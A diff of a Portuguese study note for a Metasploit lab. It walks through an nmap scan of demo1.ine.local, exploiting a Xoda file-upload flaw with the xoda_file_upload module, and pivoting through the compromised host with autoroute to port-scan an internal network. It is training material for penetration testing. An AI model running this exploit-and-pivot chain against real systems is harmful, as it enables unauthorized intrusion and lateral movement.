@@ -1,33 +1,64 @@
-#+title: Msf Second System
-#+author: gabriel
+#+TITLE: 🛡️ Msf Second System: Exploração e Pivoting
+#+AUTHOR: Gabriel
+#+OPTIONS: toc:2
 
-* lab
-após encontrar a aplicação rodando na porta 80 com o nmap -->
+* 🔍 Fase 1: Reconhecimento e Importação
+Após identificar o alvo primário, realizamos um scan detalhado para alimentar a base de dados do Metasploit.
+
+** 🛰️ Scan com Nmap
+O comando abaixo gera um arquivo XML compatível com o MSF:
 #+begin_src sh
-sudo nmap -Pn -sS -p- demo1.ine.local -oX result.xml
+sudo nmap -Pn -sV -sS -p- demo1.ine.local -oX result.xml
 #+end_src
 
-
-ligar o postgres no kali para o msfconsole -->
+** 🗄️ Preparação do Banco de Dados
+Para gerenciar os hosts e vulnerabilidades dentro do console, iniciamos o PostgreSQL.
 #+begin_src sh
-service postgresql start
-#+end_src
+# Iniciar serviço e abrir console
+sudo service postgresql start
+msfconsole -q
 
-msfconsole -->
-#+begin_src sh
-msfconsole
-#+end_src
-
-importar o xml no msf -->
-#+begin_src sh
+# No msfconsole:
 db_import result.xml
+hosts
+services
 #+end_src
 
-agora no workspace atual está salvo as informações obtidas com o Scan, pode-se conferir com os comandos hosts, services, vulns.
+* 🚀 Fase 2: Exploração (Xoda File Upload)
+Identificamos a aplicação *Xoda* na porta 80, vulnerável a Arbitrary File Upload.
 
-após verificar a aplicação rodando na porta 80, é uma aplicação com uma vuln conhecida, a aplicação xoda possui uma CVE antiga de file upload, onde é possível obter um webshell
+** 🛠️ Configuração do Exploit
+#+begin_src msf
+use exploit/unix/webapp/xoda_file_upload
+set RHOSTS demo1.ine.local
+set TARGETURI /xoda/
+set LHOST <seu_ip_tun0>
+exploit
+#+end_src
 
+* 🌐 Fase 3: Post-Exploitation e Pivoting (Movimentação Lateral)
+Ao obter o shell, verificamos que o host possui uma segunda interface de rede (~192.168.1.0/24~, por exemplo), permitindo alcançar alvos internos.
 
-basta ajustar os params do msf, como TARGETURI, PORT e LHOST corretamente .
+** 📍 Identificação da Rede Interna
+Dentro da sessão do Meterpreter:
+#+begin_src msf
+meterpreter > ipconfig
+meterpreter > run autoroute -s 192.168.1.0/24
+#+end_src
 
-após obter o webshell, é possível verificar que o sistema está ligado em outra interface, podendo obter conectividade com outros hosts
+** 🕵️ Scanning no Novo Alvo
+Com a rota estabelecida, o tráfego do Metasploit agora passa por dentro da máquina comprometida.
+#+begin_src msf
+# Colocar sessão em background
+meterpreter > background
+
+# Usar scanner de portas no alvo interno
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.5  # IP encontrado na rede interna
+set PORTS 1-1000
+run
+#+end_src
+
+* 📝 Notas de Estudo
+- **Autoroute**: Comando essencial para criar o "túnel". Sem ele, o MSF tenta enviar pacotes pela sua interface local e nunca atingirá a rede interna.
+- **Xoda**: Vulnerabilidade clássica de falta de sanitização no upload de arquivos PHP.
